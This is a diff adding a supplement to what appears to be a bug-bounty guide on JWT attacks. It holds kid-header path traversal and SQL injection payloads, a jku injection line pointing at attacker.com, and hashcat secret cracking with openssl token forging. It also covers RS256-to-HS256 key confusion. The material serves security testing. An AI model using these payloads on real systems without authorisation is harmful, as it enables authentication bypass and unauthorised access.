@@ -116,6 +116,32 @@ curl -s -H "Authorization: Bearer TAMPERED_TOKEN" https://TARGET/api/admin/users
 - `jwt_tool` (external) — comprehensive JWT testing
 - `hashcat -m 16500` — JWT secret cracking
 
+## HowToHunt Advanced Supplement
+
+> **Source:** [KathanP19/HowToHunt — JWT](https://github.com/KathanP19/HowToHunt/tree/master/JWT) (528 lines, OLD_JWT_ATTACK_Notes). Licensed GPL-3.0.
+
+**Additional JWT attacks from HowToHunt:**
+
+```bash
+# kid path traversal / SQLi
+# Header: {"kid": "../../etc/passwd"} or {"kid": "1' UNION SELECT 'key'"}
+curl -H "Authorization: Bearer header.payload.signature" https://target.com/api
+# Test kid with: ../../dev/null, /etc/passwd, 1' OR '1'='1
+
+# jku/x5u header injection (fetch attacker JWK)
+# Header: {"jku": "https://attacker.com/jwks.json"}
+# Host attacker JWKS with your public key, sign token with private key
+
+# Weak secret brute force (HS256 with weak key)
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+# Then forge: echo -n "header.payload" | openssl dgst -sha256 -hmac "cracked_secret" -binary | base64
+
+# alg confusion: RS256 (public key) -> HS256 (use public key as HMAC secret)
+# Decode RS256 token, change alg to HS256, sign with server's public key
+```
+
+Test for `none` alg, key confusion, and `kid` traversal together — HowToHunt reports `kid` SQLi as critical P1 when combined with JWT.
+
 ## References
 
 - [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
